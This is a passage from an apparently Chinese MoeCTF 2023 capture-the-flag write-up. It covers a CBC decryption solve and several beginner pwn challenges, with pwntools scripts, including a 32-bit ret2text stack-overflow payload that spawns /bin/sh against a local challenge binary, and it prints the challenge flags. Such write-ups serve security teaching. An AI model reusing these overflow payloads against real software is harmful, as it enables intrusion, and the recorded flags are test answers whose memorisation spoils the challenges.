&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    74697733110, 43107579733, 465430019828, 178715374673,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    425695308534, 164022852989, 435966065649, 222907886694,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    420391941825, 173833246025, 329708930734
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def decrypt_block_cbc(key):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    decrypted = []
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(1, len(encrypted_blocks_with_iv)):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        decrypted_block = encrypted_blocks_with_iv[i] ^ encrypted_blocks_with_iv[i - 1] ^ key
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        decrypted.append(decrypted_block)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return decrypted
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;decrypted_blocks = decrypt_block_cbc(key)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def base_to_decimal(blocks, base):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    blocks_reversed = blocks[::-1]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    decimal_val = 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i, block in enumerate(blocks_reversed):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        decimal_val += block * (base ** i)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return decimal_val
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag = long_to_bytes(base_to_decimal(decrypted_blocks, base))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(flag)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# b&amp;#39;moectf{thE_c6c_Is_not_so_hard_9ifxi9i!JGofMJ36D9cPMxroif6!M6oSMuliPPcA3}&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;pwn&quot;&gt;Pwn&lt;a class=&quot;zola-anchor&quot; href=&quot;#pwn&quot; aria-label=&quot;Anchor link for: pwn&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;ru-men-zhi-bei-3&quot;&gt;入门指北&lt;a class=&quot;zola-anchor&quot; href=&quot;#ru-men-zhi-bei-3&quot; aria-label=&quot;Anchor link for: ru-men-zhi-bei-3&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;moectf{M4ke_A_Promi5e_7hat_1_C4nn0t_Re9ret}&lt;&#x2F;p&gt;
&lt;h3 id=&quot;test-nc&quot;&gt;test_nc&lt;a class=&quot;zola-anchor&quot; href=&quot;#test-nc&quot; aria-label=&quot;Anchor link for: test-nc&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ nc localhost 44085
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Oh, welcome here. Here is a shell for you.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ls -la
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;total 92
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;drwxr-x--- 1 0 1000  4096 Aug 14 09:58 .
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;drwxr-x--- 1 0 1000  4096 Aug 14 09:58 ..
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-rwxr-x--- 1 0 1000   220 Feb 25  2020 .bash_logout
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-rwxr-x--- 1 0 1000  3771 Feb 25  2020 .bashrc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-rw-r--r-- 1 0    0    41 Aug 14 09:58 .flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-rwxr-x--- 1 0 1000   807 Feb 25  2020 .profile
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;drwxr-x--- 1 0 1000  4096 Aug  8 04:20 bin
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;drwxr-x--- 1 0 1000  4096 Aug  8 04:20 dev
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-rw-r--r-- 1 0    0    31 Aug 14 09:58 gift
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;drwxr-x--- 1 0 1000  4096 Apr 29 13:36 lib
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;drwxr-x--- 1 0 1000  4096 Apr 29 13:36 lib32
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;drwxr-x--- 1 0 1000  4096 Apr 29 13:36 lib64
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;drwxr-x--- 1 0 1000  4096 Apr 29 13:36 libx32
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-rwxr-x--- 1 0 1000 19656 Aug  8 04:19 test_nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cat .flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{8Z3WdoCA1yTVggZE5mquNP-8nOqQKUAM}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;baby-calculator&quot;&gt;baby_calculator&lt;a class=&quot;zola-anchor&quot; href=&quot;#baby-calculator&quot; aria-label=&quot;Anchor link for: baby-calculator&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import re
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from pwnlib.tubes.remote import remote
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;io = remote(&amp;quot;127.0.0.1&amp;quot;, 45499)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ret = io.recvline()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;count = 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;while 1:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(ret)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if count == 100:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(io.recvall())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        break
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if b&amp;quot;=&amp;quot; in ret:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        status = eval(re.sub(&amp;quot;=&amp;quot;, &amp;quot;==&amp;quot;, ret.decode()))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if status:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(&amp;quot;BlackBird&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            count += 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            io.sendline(b&amp;quot;BlackBird&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            ret = io.recvline()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(&amp;quot;WingS&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            count += 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            io.sendline(b&amp;quot;WingS&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            ret = io.recvline()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        ret = io.recvline()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# moectf{H4ve_y0u_rea11y_useD_Pwnt00ls??????}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;fd&quot;&gt;fd&lt;a class=&quot;zola-anchor&quot; href=&quot;#fd&quot; aria-label=&quot;Anchor link for: fd&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;反编译可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  int input; &#x2F;&#x2F; [rsp+4h] [rbp-6Ch] BYREF
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  int fd; &#x2F;&#x2F; [rsp+8h] [rbp-68h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  int new_fd; &#x2F;&#x2F; [rsp+Ch] [rbp-64h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char flag[80]; &#x2F;&#x2F; [rsp+10h] [rbp-60h] BYREF
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  unsigned __int64 v8; &#x2F;&#x2F; [rsp+68h] [rbp-8h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  v8 = __readfsqword(0x28u);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  input = 0;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  init();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;Do you know fd?&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  fd = open(&amp;quot;.&#x2F;flag&amp;quot;, 0, 0LL);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  new_fd = (4 * fd) | 0x29A;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  dup2(fd, new_fd);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  close(fd);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;Which file do you want to read?&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;Please input its fd: &amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  __isoc99_scanf(&amp;quot;%d&amp;quot;, &amp;amp;input);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  read(input, flag, 0x50uLL);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(flag);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  return 0;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;fd&lt;&#x2F;code&gt; 的值通常从3开始（0, 1, 2通常是标准输入、输出、错误）&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;fd = 3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;new_fd = (4 * fd) | 0x29A
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(new_fd)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# 670
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;输入 &lt;code&gt;670&lt;&#x2F;code&gt; 后即可得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{3NweDualuBwfyp6GlkyYbwJIExehrO5q}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;int-overflow&quot;&gt;int_overflow&lt;a class=&quot;zola-anchor&quot; href=&quot;#int-overflow&quot; aria-label=&quot;Anchor link for: int-overflow&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;反编译可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;void __cdecl vuln()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  int n; &#x2F;&#x2F; [rsp+4h] [rbp-Ch] BYREF
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  unsigned __int64 v1; &#x2F;&#x2F; [rsp+8h] [rbp-8h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  v1 = __readfsqword(0x28u);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;Welcome to Moectf2023.&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;Do you know int overflow?&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;Can you make n == -114514 but no &amp;#39;-&amp;#39; when you input n.&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;Please input n:&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  get_input(&amp;amp;n);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  if ( n == -114514 )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    backdoor();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;Maybe you should search and learn it.&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过计算可以得到 &lt;code&gt;-114514&lt;&#x2F;code&gt; 的补码为 &lt;code&gt;4294852782&lt;&#x2F;code&gt; ，通过输入后交互即可得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{DE9AMxUIxA7q0JTWqPK_cg-yyklcF71U}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;ret2text-32&quot;&gt;ret2text_32&lt;a class=&quot;zola-anchor&quot; href=&quot;#ret2text-32&quot; aria-label=&quot;Anchor link for: ret2text-32&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Desc：一道最基础的32位栈溢出题OvO&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;下载附件使用 IDA 打开后对 main 进行反编译可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  init();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  vuln();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  return 0;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ssize_t vuln()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  size_t nbytes; &#x2F;&#x2F; [esp+Ch] [ebp-5Ch] BYREF
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char buf[84]; &#x2F;&#x2F; [esp+10h] [ebp-58h] BYREF
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;Welcome to my stack in MoeCTF2023!&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;What&amp;#39;s your age?&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  __isoc99_scanf(&amp;quot;%d&amp;quot;, &amp;amp;nbytes);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;Now..try to overflow!&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  return read(0, buf, nbytes);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过查看 vuln 函数的栈如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-00000068 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-00000067 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-00000066 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-00000065 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-00000064 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-00000063 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-00000062 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-00000061 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-00000060 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-0000005F db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-0000005E db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-0000005D db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-0000005C nbytes dd ?
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-00000058 buf db 84 dup(?)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-00000004 var_4 dd ?
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;+00000000  s db 4 dup(?)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;+00000004  r db 4 dup(?)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;因此需要用其他字符填充满 0x58+0x4 ，然后开始找地址。&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;blog.csdn.net&#x2F;Morphy_Amo&#x2F;article&#x2F;details&#x2F;121757953?ydreferer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%3D&lt;&#x2F;p&gt;
&lt;p&gt;第一种，溢出后的返回地址是system的地址，也就是plt表中system的地址&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;system_addr = 0x08048320
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;binsh_addr = 0x0804a024
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;payload = &amp;#39;a&amp;#39; * (0x88 + 4) + p32(system_addr) + p32(0)  + p32(binsh_addr)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;第二种，溢出后的返回地址是call system的地址，这是程序中出现过的调用system的地址&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;system_addr = 0x08048320
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;binsh_addr = 0x0804a024
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;payload = &amp;#39;a&amp;#39; * (0x88 + 4) + p32(system_addr) + p32(binsh_addr)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FmaulAyW3IPxaSlrDEj4C%252Fret2text_32-1.png%3Falt%3Dmedia%26token%3D08692fab-9f6f-4cf7-b410-1d98a190fef5&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=f61c004c60e0571f3c9077aa528b0e1fc49bf56c3b16515132f590830ac720d2&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FtG6Y9VsF6tn0VTH9zJ8F%252Fret2text_32-2.png%3Falt%3Dmedia%26token%3D661f07a4-8696-4e66-a717-e8897eda1c7f&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=e32520cc485716c6a9ee8da3b5e4d4ac05a6ada2f412f36479e4856dc7db8ca0&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;通过查找可以找到 call system 的地址 &lt;code&gt;0x080492A9&lt;&#x2F;code&gt; 还有 &#x2F;bin&#x2F;sh 的地址 &lt;code&gt;0x0804C02C&lt;&#x2F;code&gt; ，寻找过程中可以使用 &lt;code&gt;Shift+F12&lt;&#x2F;code&gt; 通过 Strings 来找挺方便。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FBnYIF2IuKRDgnfaqC2lD%252Fret2text_32-3.png%3Falt%3Dmedia%26token%3D7a410448-852d-4ba7-b204-82a0f2f4a1fa&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=b791005c18e8f5b01fcddd14434b7af5681758bd9f11f97854baf0e346a65fe8&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;找出地址后就开始写脚本力，如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from pwn import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sh = remote(&amp;#39;localhost&amp;#39;, 42107)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sh.sendline(b&amp;#39;999&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;backdoor_addr = 0x804928c
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;system_addr = 0x080492A9
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;binsh_addr = 0x0804C02C
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;payload = b&amp;#39;a&amp;#39; * (0x58 + 0x4) + p32(system_addr) + p32(binsh_addr)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sh.sendline(payload)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sh.interactive()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;nbytes&lt;&#x2F;code&gt; 参数表示要读取的最大字节数，设置大点就行，然后通过栈溢出就能得到 sh 了。&lt;&#x2F;p&gt;
&lt;p&gt;之后就是通过 &lt;code&gt;ls&lt;&#x2F;code&gt; 和 &lt;code&gt;cat&lt;&#x2F;code&gt; 来获取 flag 了，过程如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
